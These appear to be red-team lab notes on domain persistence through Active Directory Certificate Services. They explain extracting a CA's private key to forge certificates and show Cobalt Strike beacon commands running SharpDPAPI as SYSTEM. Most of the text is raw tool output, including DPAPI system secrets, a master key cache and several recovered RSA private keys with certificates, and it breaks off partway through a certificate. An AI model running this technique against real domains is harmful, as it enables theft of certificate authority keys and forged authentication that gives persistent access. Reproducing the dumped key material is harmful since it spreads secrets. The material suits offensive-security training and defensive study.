In larger organisations, the AD CS roles are installed on separate servers and not on the domain controllers themselves.  Often times, they are also not treated with the same sensitivity as DCs.  So, whereas only EAs and DAs can access/manage DCs, "lower level" roles such as server admins can access the CAs.  Although this can be seen a privilege escalation, it's just as useful as a domain persistence method.

Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).  The default validity period for a CA private key is 5 years, but this can be set to any value during setup, sometimes as high as 10+ years.

Once on a CA, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) can extract the private keys.

showing who I am running on as `SYSTEM`
```powershell
beacon> run hostname
dc-2
```

```powershell
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)
```
command used to retrieve `private key` and `certificate`
- **NOTE: THIS COMMAND TOOK 20 MINUTES AND 15 ATTEMPTS TO FINALLY SPIT OUT THE PRIVATE KEY AND CERTIFICATE** keep running until it spits out an openssl command
```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
[*] Tasked beacon to run .NET program: SharpDPAPI.exe certificates /machine
[+] host called home, sent: 246054 bytes
[+] received output:

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               


[*] Action: Certificate Triage
[*] Secret  : DPAPI_SYSTEM
[*]    full: FB05828958B20444DBDE3EDF1A977C91C9DD25776E1B580D770C084B01CF5F232C2F211ED6B20E31
[*]    m/u : FB05828958B20444DBDE3EDF1A977C91C9DD2577 / 6E1B580D770C084B01CF5F232C2F211ED6B20E31


[12/21 00:52:38] [+] received output:

[*] SYSTEM master key cache:

{052003cb-9209-4d62-94b9-0477ee83ffaa}:509C9FE3BF878CDE049046036D350E9E5B13A078
{0630f869-46ef-4022-b8e1-6f4422380fa8}:A9A972204354A8F9B92F5CE09E6D6706FF3FCB58
{103a7ccb-4426-4f15-a38b-ccdc276a03a5}:3467874F65236904D879B8345693407EDD85D69C
{12216b25-63af-4846-a1f5-ee97f7342606}:A6775C3DB670A426AF48DC9F725098B145D9DAF1
{13129db3-34bb-4082-b41b-53c1738eb1d7}:290D75C4E47B2A9C61C60C4E3D045A566DA3CC65
{1698076d-866f-498b-9304-d741d71c25b6}:BB28B0A1B00436FA66A7DA86103C7062D709C5F5
{47968a49-7e0c-4f68-ac84-7e3f2a6874f1}:515AA576718F67DADB5B17964FEE360BEFABF77F
{58be17e0-986c-4f1d-bae4-e13793a5d10f}:5EEEBFB6CF098B15745463B40F602A09CF1FCB4B
{6e3fdee0-9862-4f41-a5bf-e3901abcae67}:39A61C6ECD541F11AA784ECC942BAB0695B60332
{7cd2b367-324e-4a68-bf8a-ebb923db5913}:275629B79ADA584106431224278BB3B24DC0EFD0
{82c7a646-8376-4ba1-92ad-e4e5a091321b}:1BBD977554D1EF9815317E58DD4B91513319E857
{b60f878c-eed5-4f48-a8d2-bee9c912a87a}:A33064099C8F69C2ABFBB6869FDC41B3F1D8B4EF
{c153dc41-b91b-4ca3-8196-0cf72bdbf7c0}:6336BE6BAAA85BFA9F73B60A5C23475F8FBA4AFB
{c2402c5e-5b3e-4bec-8dc3-f158eb4f4d1d}:BCCE3E186953547B81FD5F1570A729D12BB9097B
{e43be0a4-e46f-4212-989a-406815815a4e}:2D36B1B55257FF2E625881FE1CCBEE993AF17F28
{ea3e5f2c-bd0e-4321-8e01-8aa5025a343c}:9BD6C3F55E85DADFF96F4CDEB5E1A7F170BBA528
{ed45dc1a-0283-4814-a9fe-84b6b3ad334a}:12461F3CE09A8265D1491D25FE363660E03CCB29
{fad41071-138a-449d-a36a-de66d92cc335}:65F2555B6B4B4A330873798363B378A503048EF3
{fdb3edb1-78e4-4c8e-859f-2bdf7ffdc22a}:89173447339BF769163525B0C30538A5060683BC
{ff189684-61fe-44c0-9301-399ed4a8f2b6}:17829EABCE3E664EC9BBF3D29B786788C27D8642
{3af9b984-1427-4737-a5a7-af68740a2438}:A9F6534001291F012CF5E519AA85DCF948DCEC19
{3e2a8705-4b41-4ab5-83ba-c75b45ad8f61}:7E8C3F46EFEC363EB77FECD857B4082CC3CD8473
{447d8c17-487d-42e2-9b5c-0015318d2ae4}:12CF7F5DF8C010441BC571123885AFD59E843A24
{4716c57c-3c3f-4658-85e4-d17a1b9bbe91}:1906A5E0C27041D97003D2C5EA4E4E076B9C8DA7
{52637812-e54a-482b-b25b-4560c8c9400c}:4189AFBBD6D2C87077D5A06BE512DAF859112F2D
{6169ad5b-3847-4cd7-8430-192384efe7a7}:ABC0CE8A8781058FFE1DB10796A393D15D0ED6F3
{6b29d08a-203c-4a92-a287-0ad1fb388850}:21C70432F21DC12319C7BE72576208026177F8EB
{80f1406b-a52f-4c6e-a498-8ef3297409a7}:1DD04B2C21EC0C2239682D4704E89FF553363812
{86c3defd-4ebe-4b3a-8b70-8ab64269a752}:8F12D55819A7866B25C90AC456E9F9C6B7AB9860
{b4f8f679-3fbb-4778-a62c-7e3474543ed4}:CA15CB52A09BCEF153011CE08C0935C756716E0C
{b9dadacc-c49a-46fb-ac91-165a46bb413a}:AD9AF775C436942ED6C43227D49251803B743283
{ba34ac75-b04e-411d-8b9e-b96cc94c4303}:EE094DC1C76A5A6356F181ED743256420023EFF0
{bf0e6085-9668-457f-91be-25ab580b81f9}:FBDE425C63384B1C497867650443A664BD871A66
{d6642dfc-43d0-41a8-91b6-95ad245ffdc3}:720B341A6D0C5B989DE069799983892B72932C04
{deeb03ff-0a44-49f6-96a1-958af7b5c7d3}:E90C665F81016F9329479F930D08D7DA54936980
{e09fd7a1-9bea-420f-8561-1b33d0645800}:B7C32317DA27155266157DB243C7EE0ECBB51416
{f8b140b6-a4a2-4a39-9da2-183aa0d82705}:AF46FAB02C550E82386CE57121556D65918B38B2
{fe4903de-c37a-44c3-aee0-16185d074a15}:2F2E5BE7BE365882154A0BB447F6168BC5A7B4FF


[*] Triaging System Certificates


Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys


[12/21 00:52:39] [+] received output:
  File               : 2822ad554ec2f07f8f1fda5ebc25ab73_d0c48e6a-1237-4eca-bb8c-9b22df87997d

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {fad41071-138a-449d-a36a-de66d92cc335}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : d8279569e89d37fdc30b614ea9debe172e51a04fa256cd2cd88e4b594eb5c675
    HMAC             : b15cc9ca06275080f86208118088103918d773dec61adbc2bcd46fee0171d6ce
    Unique Name      : te-KerberosAuthentication-9b0f15be-a80c-4957-b469-d48960eaa7a6

    Thumbprint       : C9F0A12D2B5CAE1D6CB894199100BFF867C543DE
    Issuer           : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
    Subject          : 
    Valid Date       : 9/25/2023 4:59:21 PM
    Expiry Date      : 8/15/2024 4:16:13 PM
    Enhanced Key Usages:
        Client Authentication (1.3.6.1.5.5.7.3.2)
         [!] Certificate is used for client auth!
        Server Authentication (1.3.6.1.5.5.7.3.1)
        Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
        KDC Authentication (1.3.6.1.5.2.3.5)

    [*] Private key file 2822ad554ec2f07f8f1fda5ebc25ab73_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAt9qVmCPDrRFB7ttQuyTVYc2pzVXnSZ7b7HDyO2iE2XmXGP3V
WxAkQM9D5tF72pgpvELIVMr1xYM+PUSt0f6HdwfBK9NX+Dk15cz7SoLLG6nM6bK5
rNJzoV25leiWIZZ7cpWT/m/oaH9Zy0ZRFv/l7RqAgiO8dUg5QbDLtE+yfM+eKbqz
UG4H18WgpdMRpyqgy4IjxkRbTBYBtd223P+towFs9At/qx9v/ermmBIWimfyXgDs
gItYE7lQVVtxN9109uUQjhU5SD+EgwjDmjbJB3Tm3S07cQig/r8EqU34p1VnQx1F
a/OPvYerRiilxN5rGbWWEKuxt2GuCa3C/60UKQIDAQABAoIBAQCWLyFqMTTjyCgi
1NaiuRjxls3xZQ3VDsa54x2Mt/llqTRrftZtV8c1hdoCz/arfwcAuVDqKw0O9gG+
jL6svo2sBxKeGTtQEnPbr1FK8YK2q0MvWAbijNtV4rj6Iw+YilN3K4bEHmgsDHOu
YFdXQVxyDecR591HtOLIrYIJXd0ApDkC4f6V3YqeZso+lIQkF0ppc/66gan1IXDp
dsn9mufTuhmEpxstWm5j8eamX81Do9PmJh0smHbXhpvfoikEk0c2bxGFlwGZGs3h
LCXwl/iIGKgg4AsWxCCCe9iZ39kYY4bL9/hDgUphT5M57yQfiN3CtzdEiXSlSI/w
DzU5tBAtAoGBAMgBQj0EsRthXaR3QD6HrubjzR18AZ0eCZO5bSuWN2PsiwqZpGLC
z3zhXQ5JDuQwJZLYE+kuvz1uXGfpNBOEfkw1NdRy69h7RLDD7ZCk7109MZsc2KvY
2Pp6YAotu6wPY32ZnLD8l0NQG6zLECM9+DQ6tmqpItDO/eot8ca7PqO/AoGBAOtT
vzQcKEQQEP+4AcuUOOMMyfkpTA0SrMlJp5nTc9s3/Zi3FTuiRf6zfAAytf/G4ogG
rwc32jG+Hx0xzzaIgo0bRIMcEoxgtxnUliRCfjijOO6yiJ33Dbd2FfGdE4QupOdi
MM1N2KEERcAggVzbRrn0fJ+Nuqv6W/IRXOLT8yIXAoGAf4QN70lmgcZ6JbnCRBvN
73ed9wZxIPNdt8mpSPjlJ9hQbdm3bSA3ma813T3HOMVZr14Ek88yLsCGOdn9UdRP
kdb7ExCSPduZ1/mTJX2C/zdcwUCLBEWlUU1knhi6ZuEI1bNyq4TgDBKvEmQFTfLc
pLAqTaa4g9j1GrFgTQxky5ECgYEAjGJRVgzWGIRdH6/tojyyEwC2HGV+cO4LFalS
ynlSTByCtG/DwudzShZYiuW1nPhQe0VBdNTk3XfFp+zm6GlXOEZkALLmfcfUcxxW
1Rq1oaP9eqgWx+Vx0VgojxJdaiVJSp9Q7aja6nNaCNtbUMGe15/6GFS8X4vi/e1N
tCMsj9ECgYAWuFIM/Om0ZIXl6LFlJvfusV/SX8oIhwhZZjwmXw9Bog2Itf32xyRG
DvY2DcwZHiJh7fPaHk9eLR4QWT5EQ3odf7hVW6xUGkU9q11P/qwqdbz9Rnat7Z17
v2bKDlkUB2h3KWkqa04S2wxzdHF+cciSbklx7lHjr5Kz5fWxGJBNAw==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIF9zCCBN+gAwIBAgITZQAAABS3iPqVmiJhtwAAAAAAFDANBgkqhkiG9w0BAQsF
ADBWMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ8wDQYDVQQDEwZzdWItY2EwHhcNMjMw
OTI1MTY1OTIxWhcNMjQwODE1MTYxNjEzWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEAt9qVmCPDrRFB7ttQuyTVYc2pzVXnSZ7b7HDyO2iE2XmXGP3V
WxAkQM9D5tF72pgpvELIVMr1xYM+PUSt0f6HdwfBK9NX+Dk15cz7SoLLG6nM6bK5
rNJzoV25leiWIZZ7cpWT/m/oaH9Zy0ZRFv/l7RqAgiO8dUg5QbDLtE+yfM+eKbqz
UG4H18WgpdMRpyqgy4IjxkRbTBYBtd223P+towFs9At/qx9v/ermmBIWimfyXgDs
gItYE7lQVVtxN9109uUQjhU5SD+EgwjDmjbJB3Tm3S07cQig/r8EqU34p1VnQx1F
a/OPvYerRiilxN5rGbWWEKuxt2GuCa3C/60UKQIDAQABo4IDEjCCAw4wNgYJKwYB
BAGCNxUHBCkwJwYfKwYBBAGCNxUIh6ThOJb3PoLNiRiGyL97hvKHAkwBIQIBbgIB
ADAyBgNVHSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysG
AQUCAwUwDgYDVR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUH
AwIwCgYIKwYBBQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFME0GCSsGAQQB
gjcZAgRAMD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS01NjkzMDU0MTEtMTIx
MjQ0MDQyLTIzNTczMDE1MjMtMTAwMDA8BgNVHREBAf8EMjAwghZkYy0yLmRldi5j
eWJlcmJvdGljLmlvghFkZXYuY3liZXJib3RpYy5pb4IDREVWMB0GA1UdDgQWBBTs
4v/tCg0C/iP5uvWCiGtJrpWfzjAfBgNVHSMEGDAWgBS5hbKqSgvID1z0psmWZ7vL
b9A+yjCBwwYDVR0fBIG7MIG4MIG1oIGyoIGvhoGsbGRhcDovLy9DTj1zdWItY2Es
Q049ZGMtMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERDPWlvP2NlcnRp
ZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmli
dXRpb25Qb2ludDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRh
cDovLy9DTj1zdWItY2EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y3liZXJib3RpYyxEQz1p
bz9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOpbl+jvVydBtNqFh2qDhRe8Sc216
79tEwZRCluWSZmq5BtGouPRQajfsyDNXWwpWABn8cXM/8bSuqokUZMhUyo9dxJsq
38PMY3n7RZQqsJccv0D73WMEpaRDpUmCEmgcZETRULq/kvkik5/72bia2UFA8GP6
ChFvf5PMMXPt548NOwppnueD2xDAI7j5HgzslkhTd6BgUMMD3oJ6KHdjxuMugItU
WuJhxH7yz0sZ+R7GXkogjW5ypHg+gjw4Zv6sxmmUJXggV1oDmNow3e63HPsCE6uW
4WnsMNmXq5Nl14K58Y2ZTMh3aGabIQQxnnTqd9oTzcz7WnmBWA1tvFBJxA==
-----END CERTIFICATE-----



[12/21 00:52:39] [+] received output:
  File               : 501b202b1cf79f71b707dfe771ff71e5_d0c48e6a-1237-4eca-bb8c-9b22df87997d

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {fad41071-138a-449d-a36a-de66d92cc335}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : bee53a9e4f154cbc9fb30431f8d8b15e0e77a4c626c22f440433d0d6928f49c5
    HMAC             : c6d48585ded2a8a608dce9e26fc5f771d1b9a0808406086103165cc58854edcc
    Unique Name      : te-DomainControllerAuthentication-5cf60db8-366b-41d5-bd86-e5483ab663a0

    Thumbprint       : 6EFA13084EF42F5760260CDB219F5D72EC6867A4
    Issuer           : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
    Subject          : 
    Valid Date       : 7/5/2023 8:58:03 AM
    Expiry Date      : 7/4/2024 8:58:03 AM
    Enhanced Key Usages:
        Client Authentication (1.3.6.1.5.5.7.3.2)
         [!] Certificate is used for client auth!
        Server Authentication (1.3.6.1.5.5.7.3.1)
        Smart Card Logon (1.3.6.1.4.1.311.20.2.2)

    [*] Private key file 501b202b1cf79f71b707dfe771ff71e5_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA3Bawvq59UucyqXbGEgAcpP8rxXtABcomNJIZN4pSbGn+iiJV
oYfH/sbXIs8gQ6M5+iJ39V6YOz7GPZv6LrPKSi8CA9CB6juB8rI1GB16lqvfJi67
EfbYcBnHMzrzALr4XKzh+kaLqptnQGwT6yJidpDlVQfNkKSft+UQujH+oap1g/Hj
opCrS948zUYmmzcnVXd4XPQmuqEe8qs7MRYLFgzTiqDjCTIPOYS2IdYYar/m+09m
SLcFsQmeWW1C+0c99l7RMwSsvHeJ2h0Yxnrp9NCrVK6hsfWgWcUddfXrryMiYszi
4Mhq4i0KzgBM3NFfJaKWjw56BkBsih9ZzFjH5QIDAQABAoIBABeQkmIIOsDqokEE
x5ZbzrVX4O7nEGbOSyLr1aldtQ+Ilclifbqq2B4OWjCO7sxvKKEAmcl61F/bi8xC
7BmeBHXG7LdN1usmbfZ3YDnxxhNl2aGz9TGqNWhjSjHRCP22ByudEyEB9qhQtVBv
gf52EwbQ4s0k5byr87Hz48Ob4MCcVdeo4XA+mnCn6sTBbT7tz54pdhuR/XkgRLyy
th+1si/YL+W2oy81zdcSPI4C8utoH6Xc/fN+JBJX6mo4LmF737kIpzhD+1nmuftY
TdDbkiSNYfi4c+KddosbiAS8v0m4QMNh+533A4Nsin+wi1w7x0aEnJecGll7XlvR
wsYw0y0CgYEA5egaLnTkh2G1lvmNOsOabbGdYZNGc9NcJy6a8iMTSgSjoBmwr49I
l9e6hLjbmnkr9wBb3aUWMMAGpRqr7RYyzb/XjsO0h7Hwi8UizSmLbQlBO8wuHUKk
5+i9kIzM33e1muvARVsH+oXECIsde/OpKLmffJuZiErMqbcNrHdcU3sCgYEA9RFT
0ZgOCQRzKqxG/D8cpoYm6XmYWtRhd0ZKe2K6/whZfHvBEamFwcZoGrVtmQmU/lGJ
xtx3EynaMdM39K4p9KYm74MnAYwvOBZH2hvrCXvnVxYA4NfmHKOXiyZZwFoHwsyl
soCC/ABTV0ICQy7e5md+C2Li8QSJnrxyAa6aRB8CgYEA3yy6DZLHLGw7HD1PTVYH
mKgsAEY4w8LO1/Iz0w0dcmKie420qBdM/qkZlDDmbENn3DPq+XOB4Pzm9mq3rkQ4
OOYbV6i+nGKtAODy8Xl8sPGk82k28ox5C+4v5hvn3J2WGrbzQ+AkFJq5OxngGyzi
bngSS6G4HkeN+MmLannLk/UCgYEAwf+9gqYENk83fAh1CSpM2+ZG13xSh1So82rJ
e3Nk5I8Ph+PPqtOv9v3BW6NT51oWgFy73JiaCqmO+PJj0WYuAGWnXONN9YOrvZKl
vptrLE7Ri7b3awZ+Ox2l0ZnCYuriSesHII9rIWKAlwrCD70C5xH2Tb0yOemFqAs1
lO9LX7ECgYEAvIc+UX9JKj8UFWFY5c9mOTJJ3FJ0B0aVoUIlFwk2Nk/NQGi63O0a
KCNmjEc6AT5XR/d2M7NNnuN0WnPpTb48HJBrxss3M7CajEfvRCgUkl49raHBktk+
urFzgKKM1EaG/vTYr/U/y7hYL+WJBwQAxDxxGiHTLPuR18uCxu+yYnc=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFyzCCBLOgAwIBAgITZQAAABJ7L0PN7WUq2wAAAAAAEjANBgkqhkiG9w0BAQsF
ADBWMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ8wDQYDVQQDEwZzdWItY2EwHhcNMjMw
NzA1MDg1ODAzWhcNMjQwNzA0MDg1ODAzWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEA3Bawvq59UucyqXbGEgAcpP8rxXtABcomNJIZN4pSbGn+iiJV
oYfH/sbXIs8gQ6M5+iJ39V6YOz7GPZv6LrPKSi8CA9CB6juB8rI1GB16lqvfJi67
EfbYcBnHMzrzALr4XKzh+kaLqptnQGwT6yJidpDlVQfNkKSft+UQujH+oap1g/Hj
opCrS948zUYmmzcnVXd4XPQmuqEe8qs7MRYLFgzTiqDjCTIPOYS2IdYYar/m+09m
SLcFsQmeWW1C+0c99l7RMwSsvHeJ2h0Yxnrp9NCrVK6hsfWgWcUddfXrryMiYszi
4Mhq4i0KzgBM3NFfJaKWjw56BkBsih9ZzFjH5QIDAQABo4IC5jCCAuIwNgYJKwYB
BAGCNxUHBCkwJwYfKwYBBAGCNxUIh6ThOJb3PoLNiRiGyL97hvKHAkwBHAIBbgIB
ADApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIwDgYD
VR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYB
BQUHAwEwDAYKKwYBBAGCNxQCAjBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZ
AgGgLgQsUy0xLTUtMjEtNTY5MzA1NDExLTEyMTI0NDA0Mi0yMzU3MzAxNTIzLTEw
MDAwJAYDVR0RAQH/BBowGIIWZGMtMi5kZXYuY3liZXJib3RpYy5pbzAdBgNVHQ4E
FgQUB+Ba9KGJTvia892xAo9qyzEPYlgwHwYDVR0jBBgwFoAUuYWyqkoLyA9c9KbJ
lme7y2/QPsowgcMGA1UdHwSBuzCBuDCBtaCBsqCBr4aBrGxkYXA6Ly8vQ049c3Vi
LWNhLENOPWRjLTIsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y3liZXJib3RpYyxEQz1pbz9j
ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
dHJpYnV0aW9uUG9pbnQwgboGCCsGAQUFBwEBBIGtMIGqMIGnBggrBgEFBQcwAoaB
mmxkYXA6Ly8vQ049c3ViLWNhLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2
aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVyYm90aWMs
REM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAG9prrjbC/ySZWdp4Hv4i+Hj
252gZ8qVbZDiTvjwS7uUIX8uLzyjF7qDTe8BeORjwzzOhq2t+oKizSpqjn4xpjHW
HjCjcfHKnvIn2W5KPqjxDcgwOe3zVzVejv+qi0b/Hxsu5keiqipMdm1jtJd5wOxX
78V9Ao5JUn6dpQjgvi5ao1j7xLu9sBxHSSa8dp9IqmlbuJXnuGEeHAntbTpUtZka
YhrIFcAiKpVyrgG16I2+Ogs4YQEMcYBlqDdE+klYJewLuGwiYNdwncxx7pawkFDl
CZ7XrUA0x+9S65x8uhqg26tbe3SnVWcHPIgbOSpE0mt6VLOP/RUwnCPQfAl3HWU=
-----END CERTIFICATE-----


[X] Error triaging 7a436fe806e483969f48a894af2fe9a1_d0c48e6a-1237-4eca-bb8c-9b22df87997d : Bad Data.


[12/21 00:52:40] [+] received output:
  File               : 8d801f43524955f8bf1ce333942dcf85_d0c48e6a-1237-4eca-bb8c-9b22df87997d

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {fad41071-138a-449d-a36a-de66d92cc335}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : 043bc1e4647cc963daaa5038daa322b66457868c514b0b56182a89a252065a3a
    HMAC             : 318b794c71ed4ebad56330b2d8d5b8f6e9218e9bd41f3bd2460832050afd6fb0
    Unique Name      : te-DirectoryEmailReplication-fcc69cc2-938a-42a1-aeb0-9f6485140629

    Thumbprint       : 9220C9CDD97854505A86A526D5025B2D9561B6A6
    Issuer           : CN=ca, DC=cyberbotic, DC=io
    Subject          : 
    Valid Date       : 7/5/2023 8:58:00 AM
    Expiry Date      : 7/4/2024 8:58:00 AM
    Enhanced Key Usages:
        Directory Service Email Replication (1.3.6.1.4.1.311.21.19)

    [*] Private key file 8d801f43524955f8bf1ce333942dcf85_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAyA5FZpzUyfgVPgDw2wDwflL86/oHMDa9MVqLxTMrfm95QrTs
v1QQUWaJ8Ud2m0zIDLX534IyOnw7eIusoXHtoowFuSgriBPVzfD9fHAQUvCYmf9/
TmSqXmnm1i374CWOX+5EfSJ9JlsUqpp4aSyVzWfRoMYD/M/5uVYbxzrkS9O4p6i7
W5GDccSXgjzacmqAS8+7erUuQzMyom5GwMeQsbxVU9YKxDHpIvo3hCItq63S8L30
2kxCu2+rzXnsEm6cOqQuZ4/At6DqvWnEeyQeOB+WexImBhfX/PzPiZhZnm/f1O89
dYZyYcgeuOxAHrQmFyUxKmkR+ac7vztzpyiAAQIDAQABAoIBAEMS7dfim0GAKPcZ
76ct4HQqNNyVftV+dN5YQmaCqoGAtIJWEM5xS+tO2s8Hq8+T5brFRJrYlyiewH3B
LscOYKNQGRckTbwZEmUy+HpBRGfafP+c9zz8aVawYRHMZxeW3+5v/4yJBLbYcMxm
cBqrNSqiNVmXKn0X6d1m7ndU2nhFUzxke4oruI87Iaggpb4Tb+8Sbnh6UgEch1/j
hTJHgHU3HxglQoHMZE3SW0+d9G7gGm0vPx4rjGD53/x+ecEBY2S6aZ5AmHUCoCTj
x3WBTbIGvmCKR35mK/cCkyrPLkySFzMzcSa6bfH7UZiDzsGGyoN7nHfKMeAEEwJe
N9XozFUCgYEA7o93Yce9Hq26ExIiz+1h1bUC2ZEV0zsCABQ3Vwae4MZJn6WKEfpM
juxOMaVAYxBHM9dCU3WvPwBucxZekOAjsNtq0Kg7lz0x8LpZXHrRPS6+BgKZ/lOv
qfjY5dnBCA1AzGQ+tQd7PoVi813g5liwnf3jXzvkPh5DG0TfaJS6wo8CgYEA1q41
wTDasChkT2+e2Tef8D4Qiw7WTl/VelGY8NkVU6xOcAS3ncjfMCD+eR6JwimLWj2j
hM8gqSD65UrO/rI9EuPArEbYxfOEkzxICLsBTHyi0KOdooWdMpq6/x6fiLNxpobC
llywbKcx+DkLAnifrGApXapC9WiQEqe2gh3xnG8CgYA0qx37S4LYdBiBv15KM6mG
6hi/+gUshnmRlOUG5KJNE9oLUhvijjU61LcKxOYrONvPeTXegTv4l9rKs+Sa7bFT
iY3SlWHaqRsOf8Xc4gyyClDPuOFQwh8lUphoXqP8aBinR3aEtyshiYdoHZDaqjgM
GZKKYwmoITxFl/YO+88jxwKBgHZK6DPbx6TpnNxolQ78J5UpndQCCPSGugr8i1mr
RKUmfNIcx1CaLuFGTPJQcXgbjD3dWQ0FVOnc0mMmJYkSjbSq6rADGc95r8Oxo7+r
y7tpsg1lGqdDGKuZtxB8v0uEFUu9Vdukl1JHjrFIPVjPPqytEB4cg2jWhQzCfT6V
YVzhAoGBAOSurDmizBuPiLW1HUPVle1AogwK3ArfoueyHCv4ItRjDe0LXroNSUK3
UUzCluH/JqTGlXEaSY+91pAYfMxj1ilkB/jw9TNQ1PgDzASjlW4uXe3x/5olKSvx
Hvt1ghgrDn5wCA6CnvlGfhhfyUKTyoulPPxYyIKtzJYH3xau55nS
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGFzCCBP+gAwIBAgITEwAAAA5ggQ8oqfQSQgAAAAAADjANBgkqhkiG9w0BAQsF
ADA9MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMQswCQYDVQQDEwJjYTAeFw0yMzA3MDUwODU4MDBaFw0yNDA3MDQwODU4MDBa
MAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDIDkVmnNTJ+BU+APDb
APB+Uvzr+gcwNr0xWovFMyt+b3lCtOy/VBBRZonxR3abTMgMtfnfgjI6fDt4i6yh
ce2ijAW5KCuIE9XN8P18cBBS8JiZ/39OZKpeaebWLfvgJY5f7kR9In0mWxSqmnhp
LJXNZ9GgxgP8z/m5VhvHOuRL07inqLtbkYNxxJeCPNpyaoBLz7t6tS5DMzKibkbA
x5CxvFVT1grEMeki+jeEIi2rrdLwvfTaTEK7b6vNeewSbpw6pC5nj8C3oOq9acR7
JB44H5Z7EiYGF9f8/M+JmFmeb9/U7z11hnJhyB647EAetCYXJTEqaRH5pzu/O3On
KIABAgMBAAGjggNLMIIDRzA2BgkrBgEEAYI3FQcEKTAnBh8rBgEEAYI3FQiHpOE4
lvc+gs2JGIbIv3uG8ocCTAEdAgFzAgEAMBQGA1UdJQQNMAsGCSsGAQQBgjcVEzAO
BgNVHQ8BAf8EBAMCBaAwHAYJKwYBBAGCNxUKBA8wDTALBgkrBgEEAYI3FRMweAYJ
KoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAsG
CWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFlAwQB
BTAHBgUrDgMCBzAKBggqhkiG9w0DBzBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQB
gjcZAgGgLgQsUy0xLTUtMjEtNTY5MzA1NDExLTEyMTI0NDA0Mi0yMzU3MzAxNTIz
LTEwMDAwRQYDVR0RAQH/BDswOaAfBgkrBgEEAYI3GQGgEgQQgOn0f9EI+EWk3icG
